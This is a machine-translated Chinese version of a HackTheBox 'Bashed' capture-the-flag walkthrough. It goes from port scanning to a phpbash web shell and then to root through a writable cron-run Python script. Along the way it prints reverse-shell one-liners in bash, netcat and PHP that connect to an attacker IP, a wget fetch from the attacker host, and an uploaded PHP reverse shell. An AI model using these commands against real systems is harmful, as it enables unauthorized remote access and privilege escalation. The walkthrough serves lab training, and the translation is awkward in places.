<html>
<head>
<title>Bashed-A HackTheBox Writeup</title>
<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
</head>
<body>
<h1 class="translated">一篇关于黑客的文章</h1>
<blockquote>原文：<a href="https://infosecwriteups.com/bashed-a-hackthebox-writeup-176884601d86?source=collection_archive---------0-----------------------#2019-02-09">https://infosecwriteups.com/bashed-a-hackthebox-writeup-176884601d86?source=collection_archive---------0-----------------------#2019-02-09</a></blockquote><div><div class="fc ie if ig ih ii"/><div class="ij ik il im in"><div class=""/><blockquote class="jn jo jp"><p id="b16f" class="jq jr js jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko ij bi translated">所以，我刚从<a class="ae kp" href="https://www.hackthebox.eu" rel="noopener ugc nofollow" target="_blank"> HackTheBox </a>开始，整个想法真的很棒，为全世界的黑客提供在线CTF来练习和磨练他们的技能。对<a class="ae kp" href="https://www.youtube.com/channel/UCa6eh7gCkpPo5XXUDfygQQA" rel="noopener ugc nofollow" target="_blank"> IPPSEC </a>的另一个大喊，为了更好地理解，本文中使用的图像取自他的视频。</p></blockquote><figure class="kr ks kt ku gt kv gh gi paragraph-image"><div role="button" tabindex="0" class="kw kx di ky bf kz"><div class="gh gi kq"><img src="../Images/0726df33aeb86b12b12e563e6c79a30d.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*aAkyWaBpV_4i3GzPuNDStA.png"/></div></div></figure><p id="4467" class="pw-post-body-paragraph jq jr iq jt b ju jv jw jx jy jz ka kb lc kd ke kf ld kh ki kj le kl km kn ko ij bi translated">这篇文章是一个容易理解的一步一步的过程，其中我详细解释了如何获得“被攻击”的机器的根访问权的过程之一。</p><h1 id="d9db" class="lf lg iq bd lh li lj lk ll lm ln lo lp lq lr ls lt lu lv lw lx ly lz ma mb mc bi translated">让我们开始吧！</h1><p id="0afb" class="pw-post-body-paragraph jq jr iq jt b ju md jw jx jy me ka kb lc mf ke kf ld mg ki kj le mh km kn ko ij bi translated">连接hackthebox机器并设置OpenVPN你可以在这里观看<a class="ae kp" href="https://www.youtube.com/watch?v=yB0_YVSaHiY" rel="noopener ugc nofollow" target="_blank"/>。所以，我就不多讨论了，进入核心部分我们开始一个一个开门。主要目标是获得对受攻击的linux机器的根访问权，现在我们只知道它的IP地址(10.10.10.68)。</p><h2 id="18ce" class="mi lg iq bd lh mj mk dn ll ml mm dp lp lc mn mo lt ld mp mq lx le mr ms mb mt bi translated">Nmap</h2><p id="98ba" class="pw-post-body-paragraph jq jr iq jt b ju md jw jx jy me ka kb lc mf ke kf ld mg ki kj le mh km kn ko ij bi translated">这是您在任何CTF中执行的第一步，您需要侵入一台机器，因为我们需要找出端口，即我们可以进入机器的网关，Nmap是最佳的工具。</p><pre class="kr ks kt ku gt mu mv mw mx aw my bi"><span id="c8a3" class="mi lg iq mv b gy mz na l nb nc">nmap -sC -sV 10.10.10.168</span></pre><p id="ea37" class="pw-post-body-paragraph jq jr iq jt b ju jv jw jx jy jz ka kb lc kd ke kf ld kh ki kj le kl km kn ko ij bi translated">上面的命令是我运行的第一个命令，用来找出机器上打开的端口。</p><figure class="kr ks kt ku gt kv gh gi paragraph-image"><div role="button" tabindex="0" class="kw kx di ky bf kz"><div class="gh gi nd"><img src="../Images/5aca2f8574d54ce5f70da97c4a637a42.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*p1-Crv9tg2ewiJHi1PGJhQ.png"/></div></div><figcaption class="ne nf gj gh gi ng nh bd b be z dk translated">Nmap输出</figcaption></figure><p id="2563" class="pw-post-body-paragraph jq jr iq jt b ju jv jw jx jy jz ka kb lc kd ke kf ld kh ki kj le kl km kn ko ij bi translated">端口80是打开的，除了什么都没有打开。端口80是易受攻击机器上最常见的开放端口之一。</p><h2 id="911e" class="mi lg iq bd lh mj mk dn ll ml mm dp lp lc mn mo lt ld mp mq lx le mr ms mb mt bi translated">网站(全球资讯网的主机站)</h2><p id="b13b" class="pw-post-body-paragraph jq jr iq jt b ju md jw jx jy me ka kb lc mf ke kf ld mg ki kj le mh km kn ko ij bi translated">所以一旦我们弄明白了这一点，我马上打开了网站，http://10.10.10.68 。</p><figure class="kr ks kt ku gt kv gh gi paragraph-image"><div role="button" tabindex="0" class="kw kx di ky bf kz"><div class="gh gi ni"><img src="../Images/774143713bb5dd3e93a6151ac4c8a339.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*6bcPx28Bf-JUOXeXY2vF3g.png"/></div></div></figure><p id="81c8" class="pw-post-body-paragraph jq jr iq jt b ju jv jw jx jy jz ka kb lc kd ke kf ld kh ki kj le kl km kn ko ij bi translated">这基本上是第一步，因为网站本身会引导您找到不同的线索和提示来入侵易受攻击的机器。</p><p id="b062" class="pw-post-body-paragraph jq jr iq jt b ju jv jw jx jy jz ka kb lc kd ke kf ld kh ki kj le kl km kn ko ij bi translated">因此，一旦我们在浏览器中打开网站，我们就会看到这个页面。</p><p id="dac3" class="pw-post-body-paragraph jq jr iq jt b ju jv jw jx jy jz ka kb lc kd ke kf ld kh ki kj le kl km kn ko ij bi translated">这个网页有一个链接，链接到一个描述phpbash的页面，并显示了一个基于web的shell命令提示符的图像。</p><figure class="kr ks kt ku gt kv gh gi paragraph-image"><div role="button" tabindex="0" class="kw kx di ky bf kz"><div class="gh gi ni"><img src="../Images/c5c26c2a6351c86a75fc71ef593c9816.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*AguoI4k2oHVLeEk_FUwt6Q.png"/></div></div></figure><p id="b086" class="pw-post-body-paragraph jq jr iq jt b ju jv jw jx jy jz ka kb lc kd ke kf ld kh ki kj le kl km kn ko ij bi translated">这个页面还为我们提供了一个到phpbash 的<a class="ae kp" href="https://github.com/Arrexel/phpbash" rel="noopener ugc nofollow" target="_blank"> Github页面的链接，这里有phpbash的代码。</a></p><p id="cecb" class="pw-post-body-paragraph jq jr iq jt b ju jv jw jx jy jz ka kb lc kd ke kf ld kh ki kj le kl km kn ko ij bi translated">基于网络的外壳给了我们一个想法，要破解这台机器，我们可能需要启动正在讨论的网络外壳。</p><h2 id="e60e" class="mi lg iq bd lh mj mk dn ll ml mm dp lp lc mn mo lt ld mp mq lx le mr ms mb mt bi translated">GoBuster</h2><p id="feb2" class="pw-post-body-paragraph jq jr iq jt b ju md jw jx jy me ka kb lc mf ke kf ld mg ki kj le mh km kn ko ij bi translated">现在，当我们收到一个开放端口80或443时，我们采取的第二步是使用GoBuster对这台机器上可能存在的子域进行详细搜索，因为这些子域会引导我们找到下一步的线索。</p><figure class="kr ks kt ku gt kv gh gi paragraph-image"><div role="button" tabindex="0" class="kw kx di ky bf kz"><div class="gh gi nj"><img src="../Images/5875fa563fdf518ef89e07f17bd0377f.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*wSHQZBrAOgXAXHoFPUHKpA.png"/></div></div><figcaption class="ne nf gj gh gi ng nh bd b be z dk translated">通过GoBuster进行子域搜索</figcaption></figure><p id="2851" class="pw-post-body-paragraph jq jr iq jt b ju jv jw jx jy jz ka kb lc kd ke kf ld kh ki kj le kl km kn ko ij bi translated">在找出不同子域的步骤中，我们找到了上面列出的几个。我们首先访问/uploads子域，它是一个空白的白色页面。</p><figure class="kr ks kt ku gt kv gh gi paragraph-image"><div role="button" tabindex="0" class="kw kx di ky bf kz"><div class="gh gi nk"><img src="../Images/28eb65e719f617f4727cbea51b3395bd.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*6y7VTJc3-CN4_B0dTS8syA.png"/></div></div><figcaption class="ne nf gj gh gi ng nh bd b be z dk translated">/dev子域</figcaption></figure><p id="7086" class="pw-post-body-paragraph jq jr iq jt b ju jv jw jx jy jz ka kb lc kd ke kf ld kh ki kj le kl km kn ko ij bi translated">然后我们进入/php子域，它包含以下数据，暴露了sendMail.php文件。</p><p id="c857" class="pw-post-body-paragraph jq jr iq jt b ju jv jw jx jy jz ka kb lc kd ke kf ld kh ki kj le kl km kn ko ij bi translated">然后我们进入dev/ subdomain，在那里我们遇到了phpbash.php脚本，它是一个基于web的shell的链接，我们可以进入下一个级别以实现root访问。</p><h2 id="2879" class="mi lg iq bd lh mj mk dn ll ml mm dp lp lc mn mo lt ld mp mq lx le mr ms mb mt bi translated">基于Web的外壳</h2><p id="52f0" class="pw-post-body-paragraph jq jr iq jt b ju md jw jx jy me ka kb lc mf ke kf ld mg ki kj le mh km kn ko ij bi translated">基于web的shell让我们可以访问命令行来运行我们的命令，这是一个很大的进步，因为现在我们有了一个命令行。</p><figure class="kr ks kt ku gt kv gh gi paragraph-image"><div role="button" tabindex="0" class="kw kx di ky bf kz"><div class="gh gi nl"><img src="../Images/648ead61b9c5db78dcb50d4efe52c1b6.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*fTKTUikPVlwgPQTXww9K5w.png"/></div></div></figure><p id="48b4" class="pw-post-body-paragraph jq jr iq jt b ju jv jw jx jy jz ka kb lc kd ke kf ld kh ki kj le kl km kn ko ij bi translated">因此，一旦我们得到这个shell，我们将运行我们的基本命令来计算我们当前拥有的特权的范围。</p><p id="2fc3" class="pw-post-body-paragraph jq jr iq jt b ju jv jw jx jy jz ka kb lc kd ke kf ld kh ki kj le kl km kn ko ij bi translated">第一个命令是“id ”,用于了解用户的详细信息。所以我们目前是一个名为www-data的用户。</p><p id="be0a" class="pw-post-body-paragraph jq jr iq jt b ju jv jw jx jy jz ka kb lc kd ke kf ld kh ki kj le kl km kn ko ij bi translated">现在，为了检查我们拥有的特权，我们将运行一个<a class="ae kp" href="https://netsec.ws/?p=309" rel="noopener ugc nofollow" target="_blank">脚本</a>来解决这个问题。为此，我们需要该脚本存在于易受攻击的机器上，因此第一步是将脚本从我们的机器转移到这台机器上。</p><p id="3dca" class="pw-post-body-paragraph jq jr iq jt b ju jv jw jx jy jz ka kb lc kd ke kf ld kh ki kj le kl km kn ko ij bi translated">首先，我们在我们的机器上下载所需的脚本，然后将它发送到我们存储关于被攻击机器的数据的文件夹中。一旦脚本出现在特定的文件夹中，我们就设置一个httpServer，这样文件夹的内容就可以通过网络获得。</p><figure class="kr ks kt ku gt kv gh gi paragraph-image"><div role="button" tabindex="0" class="kw kx di ky bf kz"><div class="gh gi nm"><img src="../Images/4e9a8e9a869d10f50c305cb812079321.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*9i9igCCgeYi3ElNAmdmIcA.png"/></div></div><figcaption class="ne nf gj gh gi ng nh bd b be z dk translated">Linux特权检查器脚本</figcaption></figure><p id="fc91" class="pw-post-body-paragraph jq jr iq jt b ju jv jw jx jy jz ka kb lc kd ke kf ld kh ki kj le kl km kn ko ij bi translated">现在，我们已经在机器上设置了httpServer。我们回到易受攻击的机器上基于web的shell，因为一旦文件通过httpServer上传，我们现在就可以使用“curl”或“wget”命令将其下载到我们的机器上。</p><p id="5c00" class="pw-post-body-paragraph jq jr iq jt b ju jv jw jx jy jz ka kb lc kd ke kf ld kh ki kj le kl km kn ko ij bi translated">这台机器上没有Curl命令，所以我们必须使用wget将文件下载到易受攻击的机器上。</p><pre class="kr ks kt ku gt mu mv mw mx aw my bi"><span id="69bc" class="mi lg iq mv b gy mz na l nb nc">var/www/html/dev# wget 10.10.14.30/LinEnum.sh</span></pre><p id="8ed7" class="pw-post-body-paragraph jq jr iq jt b ju jv jw jx jy jz ka kb lc kd ke kf ld kh ki kj le kl km kn ko ij bi translated">当从给定的文件夹执行上面的命令时，权限被拒绝，然后我们转到/dev/shm目录，上面的命令开始工作。</p><p id="8016" class="pw-post-body-paragraph jq jr iq jt b ju jv jw jx jy jz ka kb lc kd ke kf ld kh ki kj le kl km kn ko ij bi translated">一旦我们有了LinEnum.sh文件，我们就执行它来计算当前用户的特权和其他细节。</p><pre class="kr ks kt ku gt mu mv mw mx aw my bi"><span id="ad1c" class="mi lg iq mv b gy mz na l nb nc">var/www/html/dev/shm# bash LinEnum.sh</span></pre><p id="78c2" class="pw-post-body-paragraph jq jr iq jt b ju jv jw jx jy jz ka kb lc kd ke kf ld kh ki kj le kl km kn ko ij bi translated">我们获得了以下结果:</p><ul class=""><li id="e21a" class="nn no iq jt b ju jv jy jz lc np ld nq le nr ko ns nt nu nv bi translated">linux版本已更新，因此在这里发现任何漏洞的可能性极小。</li><li id="778f" class="nn no iq jt b ju nw jy nx lc ny ld nz le oa ko ns nt nu nv bi translated">目前我们的用户id是(www-data)，还有一个名为scriptmanager的用户。</li><li id="fb2f" class="nn no iq jt b ju nw jy nx lc ny ld nz le oa ko ns nt nu nv bi translated">我们可以在没有密码的情况下使用&amp; scriptmanager可以运行任何东西。</li><li id="64b1" class="nn no iq jt b ju nw jy nx lc ny ld nz le oa ko ns nt nu nv bi translated">我们目前拥有的web外壳不是持久的。</li></ul><blockquote class="jn jo jp"><p id="778c" class="jq jr js jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko ij bi translated">为了检查这一点，我们运行命令</p></blockquote><pre class="kr ks kt ku gt mu mv mw mx aw my bi"><span id="6459" class="mi lg iq mv b gy mz na l nb nc">sudo -u scriptmanager bash</span></pre><blockquote class="jn jo jp"><p id="ad20" class="jq jr js jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko ij bi translated">和</p></blockquote><pre class="kr ks kt ku gt mu mv mw mx aw my bi"><span id="6224" class="mi lg iq mv b gy mz na l nb nc">python -c ‘import pty;pty.spwan(“/bin/bash”)’ </span></pre><blockquote class="jn jo jp"><p id="48be" class="jq jr js jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko ij bi translated">但我们仍然是www-data</p></blockquote><p id="3ccd" class="pw-post-body-paragraph jq jr iq jt b ju jv jw jx jy jz ka kb lc kd ke kf ld kh ki kj le kl km kn ko ij bi translated">因此，我们获得的web shell不是持久的，我们需要获得一个持久的shell，因此我们必须执行一个反向shell。</p><h2 id="e5d6" class="mi lg iq bd lh mj mk dn ll ml mm dp lp lc mn mo lt ld mp mq lx le mr ms mb mt bi translated"><a class="ae kp" href="http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet" rel="noopener ugc nofollow" target="_blank">测笔猴</a></h2><p id="4e55" class="pw-post-body-paragraph jq jr iq jt b ju md jw jx jy me ka kb lc mf ke kf ld mg ki kj le mh km kn ko ij bi translated">为了建立到易受攻击机器的反向shell连接，我们转到由Pen-Test Monkey提供的备忘单列表。这是一个非常有用的工具。</p><p id="60dd" class="pw-post-body-paragraph jq jr iq jt b ju jv jw jx jy jz ka kb lc kd ke kf ld kh ki kj le kl km kn ko ij bi translated">第一步是在我们的机器上设置一个监听器，在这里会弹出反向shell。因此，一旦侦听器启动，我们就在易受攻击的机器中的基于web的shell中传递几个命令来启动反向shell(不要忘记更改IP地址和端口号)。</p><figure class="kr ks kt ku gt kv gh gi paragraph-image"><div role="button" tabindex="0" class="kw kx di ky bf kz"><div class="gh gi ob"><img src="../Images/ddc5810fbde7e9175f2029b586f2867e.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*3eQmU860zlpWGoaoSvTuQg.png"/></div></div></figure><p id="e0d9" class="pw-post-body-paragraph jq jr iq jt b ju jv jw jx jy jz ka kb lc kd ke kf ld kh ki kj le kl km kn ko ij bi translated"><strong class="jt ir">痛击</strong></p><pre class="kr ks kt ku gt mu mv mw mx aw my bi"><span id="327e" class="mi lg iq mv b gy mz na l nb nc">bash -i &gt;&amp; /dev/tcp/10.10.14.38/8081 0&gt;&amp;1</span></pre><p id="71e6" class="pw-post-body-paragraph jq jr iq jt b ju jv jw jx jy jz ka kb lc kd ke kf ld kh ki kj le kl km kn ko ij bi translated"><strong class="jt ir">网猫</strong></p><pre class="kr ks kt ku gt mu mv mw mx aw my bi"><span id="85e8" class="mi lg iq mv b gy mz na l nb nc">rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.10.14.38 8081 &gt;/tmp/f</span></pre><p id="17bf" class="pw-post-body-paragraph jq jr iq jt b ju jv jw jx jy jz ka kb lc kd ke kf ld kh ki kj le kl km kn ko ij bi translated"><strong class="jt ir"> PHP </strong></p><pre class="kr ks kt ku gt mu mv mw mx aw my bi"><span id="c00d" class="mi lg iq mv b gy mz na l nb nc">php -r '$sock=fsockopen("10.10.14.38”,8081);exec("/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3");'</span></pre><p id="8da6" class="pw-post-body-paragraph jq jr iq jt b ju jv jw jx jy jz ka kb lc kd ke kf ld kh ki kj le kl km kn ko ij bi translated">在所有这些尝试之后，我们仍然无法发射反向炮弹。然后我们试着上传一个php反向shell。早些时候，当我们使用GoBuster时，我们遇到了一个域/上传。我们转到易受攻击的机器中的特定目录，尝试创建一个文件，看看我们是否有权限这样做，我们键入以下命令</p><pre class="kr ks kt ku gt mu mv mw mx aw my bi"><span id="6ae7" class="mi lg iq mv b gy mz na l nb nc">var/www/html/uploads# touch test</span></pre><p id="9527" class="pw-post-body-paragraph jq jr iq jt b ju jv jw jx jy jz ka kb lc kd ke kf ld kh ki kj le kl km kn ko ij bi translated">我们打开浏览器检查URL<a class="ae kp" href="http://10.10.10.68/uploads/test" rel="noopener ugc nofollow" target="_blank">http://10 . 10 . 10 . 68/uploads/test</a>是否有效，幸运的是它有效。</p><p id="8aaf" class="pw-post-body-paragraph jq jr iq jt b ju jv jw jx jy jz ka kb lc kd ke kf ld kh ki kj le kl km kn ko ij bi translated">然后，我们将php-reverse-shell.php文件复制到我们存储LinEnum.sh文件的文件夹中，并像以前一样使用wget将php文件下载到易受攻击的机器中。我们对php文件进行必要的更改，比如更改IP地址和监听的端口号。</p><figure class="kr ks kt ku gt kv gh gi paragraph-image"><div role="button" tabindex="0" class="kw kx di ky bf kz"><div class="gh gi oc"><img src="../Images/c10eed0fec98c48fd93dfaa056a26f9d.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*qcbjWdw-Yd0fB3PlwZMosQ.png"/></div></div></figure><p id="dd01" class="pw-post-body-paragraph jq jr iq jt b ju jv jw jx jy jz ka kb lc kd ke kf ld kh ki kj le kl km kn ko ij bi translated">我们将php-reverse-shell.php文件转移到uploads文件夹，然后在浏览器上访问URL<a class="ae kp" href="http://10.10.10.68/uploads/php-reverse-shell.php" rel="noopener ugc nofollow" target="_blank">http://10 . 10 . 10 . 68/uploads/PHP-reverse-shell . PHP</a>。我们一访问这个网站，反向外壳就会在我们的机器上弹出。</p><figure class="kr ks kt ku gt kv gh gi paragraph-image"><div role="button" tabindex="0" class="kw kx di ky bf kz"><div class="gh gi od"><img src="../Images/9afcfb08c556ad72f8c5a6eb8fb13548.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*n7Xai-PstMooRS32udoa8w.png"/></div></div><figcaption class="ne nf gj gh gi ng nh bd b be z dk translated">反向外壳</figcaption></figure><h2 id="e2f7" class="mi lg iq bd lh mj mk dn ll ml mm dp lp lc mn mo lt ld mp mq lx le mr ms mb mt bi translated">卡利机</h2><p id="8708" class="pw-post-body-paragraph jq jr iq jt b ju md jw jx jy me ka kb lc mf ke kf ld mg ki kj le mh km kn ko ij bi translated">我们回到了我们的Kali机器上，反向外壳刚刚产生的地方。我们再次执行基本命令来检查我们拥有什么用户特权，shell是否是持久的。所以外壳是持久的，我们仍然是www-data。</p><p id="7718" class="pw-post-body-paragraph jq jr iq jt b ju jv jw jx jy jz ka kb lc kd ke kf ld kh ki kj le kl km kn ko ij bi translated">为了将我们自己从www-data更改为scriptmanager，我们运行以下命令</p><pre class="kr ks kt ku gt mu mv mw mx aw my bi"><span id="5416" class="mi lg iq mv b gy mz na l nb nc">$ sudo -u scriptmanager bash</span></pre><p id="39fe" class="pw-post-body-paragraph jq jr iq jt b ju jv jw jx jy jz ka kb lc kd ke kf ld kh ki kj le kl km kn ko ij bi translated">执行上述命令后，我们再次检查我们是哪个用户，现在我们是scriptmanager。</p><p id="b100" class="pw-post-body-paragraph jq jr iq jt b ju jv jw jx jy jz ka kb lc kd ke kf ld kh ki kj le kl km kn ko ij bi translated">现在我们做一个“ls -la”来查看scriptmanager对哪些文件和文件夹有读、写或执行特权。有一个名为scripts的文件夹，其特权被分配给scriptmanager，我们进入该文件夹，并再次执行“ls -la”以获得有关scripts文件夹中文件的详细信息。</p><figure class="kr ks kt ku gt kv gh gi paragraph-image"><div role="button" tabindex="0" class="kw kx di ky bf kz"><div class="gh gi oe"><img src="../Images/a298468d4ee53954b39fec23527ff065.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*RZKpVgJlPXxUaTBSb4Jf9g.png"/></div></div></figure><figure class="kr ks kt ku gt kv gh gi paragraph-image"><div role="button" tabindex="0" class="kw kx di ky bf kz"><div class="gh gi of"><img src="../Images/2c6c2757e088b2bcd378fe05e8b0c6b4.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*Qv5CegdtG3zaOKm0r9Ym0g.png"/></div></div></figure><p id="dc23" class="pw-post-body-paragraph jq jr iq jt b ju jv jw jx jy jz ka kb lc kd ke kf ld kh ki kj le kl km kn ko ij bi translated">有两个文件，其中一个是test.py，位于scriptmanager下，另一个是test.txt，位于root下，因此我们现在知道必须使用这两个文件。</p><figure class="kr ks kt ku gt kv gh gi paragraph-image"><div class="gh gi og"><img src="../Images/594e0bf545482b9cbbaf447d830cd6ad.png" data-original-src="https://miro.medium.com/v2/resize:fit:940/format:webp/1*xj_P7Bon7U-Jm3flNXP6zg.png"/></div><figcaption class="ne nf gj gh gi ng nh bd b be z dk translated">test.py(原始)</figcaption></figure><p id="bbfc" class="pw-post-body-paragraph jq jr iq jt b ju jv jw jx jy jz ka kb lc kd ke kf ld kh ki kj le kl km kn ko ij bi translated">我们打开test.py，然后分析其中编写的代码，test.py中编写的代码显示“testing 123！”在test.txt文件中。有一点很难注意到，但是test.txt文件每分钟都在更新，我们在执行“ls -la”命令时发现这一点，并看到test.txt文件每分钟都在更新。</p><p id="4d90" class="pw-post-body-paragraph jq jr iq jt b ju jv jw jx jy jz ka kb lc kd ke kf ld kh ki kj le kl km kn ko ij bi translated">这就建立了test.py和test.txt之间的链接，因此无论我们在test.py中执行什么代码，这些更改都会像根用户所做的那样发生。</p><p id="1ee4" class="pw-post-body-paragraph jq jr iq jt b ju jv jw jx jy jz ka kb lc kd ke kf ld kh ki kj le kl km kn ko ij bi translated">我们从pen-test monkey复制一个python脚本，在易受攻击的机器上启动一个根shell(正确格式化它，并在保存之前更改IP地址和端口号)</p><figure class="kr ks kt ku gt kv gh gi paragraph-image"><div role="button" tabindex="0" class="kw kx di ky bf kz"><div class="gh gi oh"><img src="../Images/80d1e1684ff80566b35c2a3e36f44226.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*_xwRc-lEMQoYKk9EDTMsDA.png"/></div></div><figcaption class="ne nf gj gh gi ng nh bd b be z dk translated">test.py(已更新)</figcaption></figure><p id="c82c" class="pw-post-body-paragraph jq jr iq jt b ju jv jw jx jy jz ka kb lc kd ke kf ld kh ki kj le kl km kn ko ij bi translated">让代码自己运行，或者只输入“python test.py ”,你应该得到一个反向shell，检查id，你应该是root。</p><figure class="kr ks kt ku gt kv gh gi paragraph-image"><div role="button" tabindex="0" class="kw kx di ky bf kz"><div class="gh gi oi"><img src="../Images/da772a4a5aa6d8945dda45985f21de29.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*pryURuV-yWU_1qkeSNu_5A.png"/></div></div><figcaption class="ne nf gj gh gi ng nh bd b be z dk translated">根访问</figcaption></figure><p id="4cda" class="pw-post-body-paragraph jq jr iq jt b ju jv jw jx jy jz ka kb lc kd ke kf ld kh ki kj le kl km kn ko ij bi translated">这就是被攻击的机器是如何被黑的。</p><h1 id="cf71" class="lf lg iq bd lh li lj lk ll lm ln lo lp lq lr ls lt lu lv lw lx ly lz ma mb mc bi translated">道德的</h1><p id="4e06" class="pw-post-body-paragraph jq jr iq jt b ju md jw jx jy me ka kb lc mf ke kf ld mg ki kj le mh km kn ko ij bi translated">熟悉你所使用的工具，清楚地列出你在每一步需要采取的步骤。不要放弃，这是你在做这些CTF时需要做的一件事，并且试着自己去做。开始的时候会很艰难，然后你会慢慢地开始一步步走起来。</p><p id="97ee" class="pw-post-body-paragraph jq jr iq jt b ju jv jw jx jy jz ka kb lc kd ke kf ld kh ki kj le kl km kn ko ij bi translated">如果你喜欢，请鼓掌让我们合作吧。获取、设置、破解！</p><p id="32f4" class="pw-post-body-paragraph jq jr iq jt b ju jv jw jx jy jz ka kb lc kd ke kf ld kh ki kj le kl km kn ko ij bi translated">网址:【aditya12anand.com】T2|捐赠:【paypal.me/aditya12anand】T4</p><p id="eac7" class="pw-post-body-paragraph jq jr iq jt b ju jv jw jx jy jz ka kb lc kd ke kf ld kh ki kj le kl km kn ko ij bi translated">电报:<a class="ae kp" href="https://t.me/aditya12anand" rel="noopener ugc nofollow" target="_blank">https://t.me/aditya12anand</a></p><p id="18ee" class="pw-post-body-paragraph jq jr iq jt b ju jv jw jx jy jz ka kb lc kd ke kf ld kh ki kj le kl km kn ko ij bi translated">推特:<a class="ae kp" href="https://twitter.com/aditya12anand?source=post_page---------------------------" rel="noopener ugc nofollow" target="_blank">twitter.com/aditya12anand</a></p><p id="06fe" class="pw-post-body-paragraph jq jr iq jt b ju jv jw jx jy jz ka kb lc kd ke kf ld kh ki kj le kl km kn ko ij bi translated">领英:<a class="ae kp" href="https://www.linkedin.com/in/aditya12anand/?source=post_page---------------------------" rel="noopener ugc nofollow" target="_blank">linkedin.com/in/aditya12anand/</a></p><p id="1473" class="pw-post-body-paragraph jq jr iq jt b ju jv jw jx jy jz ka kb lc kd ke kf ld kh ki kj le kl km kn ko ij bi translated">电子邮件:aditya12anand@protonmail.com</p></div></div>    
</body>
</html>